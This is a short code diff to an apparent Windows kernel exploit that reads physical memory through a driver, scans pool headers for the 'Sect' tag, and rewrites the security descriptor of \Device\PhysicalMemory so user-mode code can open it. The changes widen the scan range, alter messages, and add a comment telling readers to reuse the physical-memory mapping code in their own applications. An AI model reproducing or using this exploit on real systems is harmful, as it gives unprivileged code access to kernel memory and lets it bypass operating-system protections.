@@ -101,7 +101,7 @@ static HANDLE OpenPhysicalMemory()
 
 int isAscii(int c)
 {
-	return(c > 'A' && c < 'z');
+	return((c >= 'A' && c <= 'z') || c == 0x20);
 }
 
 int isPrintable(uint32_t uint32)
@@ -138,7 +138,7 @@ int main()
 
 		char *cursor = (char*)myIo.virtualmemory;
 
-		while (myIo.offset <= 0x0FFFFFFF) {
+		while (myIo.offset <= 0x7FFFFFFF) {
 			auto pPoolHeader = (PPOOL_HEADER)cursor;
 			auto skipsize = (pPoolHeader->BlockSize << 4);
 			if ((pPoolHeader->PoolTag & 0x7FFFFFFF) != 0x74636553) // Prior to Windows 8 the kernel marked “protected” allocations by setting the most significant bit of PoolTag, so care should be taken to scan for both variants
@@ -179,11 +179,14 @@ int main()
 			}
 		}
 	}
-	if (!bFound)
-		printf("Read %d bytes without finding the physical address, did you already patch? Testing access... (requires administrator or it will fail.)\n", myIo.offset);
+	if (!bFound) {
+		printf("Read %u bytes without finding the physical address, did you already patch?\nTesting access... (requires administrator or it will fail.)\n", myIo.offset);
+		
+	}
 	CloseDriver(hDriver);
 	if (!ChangeSecurityDescriptorPhysicalMemory()) {
 		printf("Failed to open hande on \\Device\\PhysicalMemory from usermode, either you don't have Administrator privilege or the exploit failed.\n");
+		system("pause");
 		return 0;
 	}
 	auto hMemory = OpenPhysicalMemory();
@@ -200,6 +203,9 @@ int main()
 
 	
 	/*
+
+	USE THIS CODE IN YOUR APPLICATION WITHOUT THE DRIVER PART TO USE PHYSICAL MEMORY !!!
+
 	if(MapPhysicalMemory(hMemory, &dwOffset, &dwRead, (PDWORD64) & myMemory))
 	{
 		char	*cursor = myMemory;
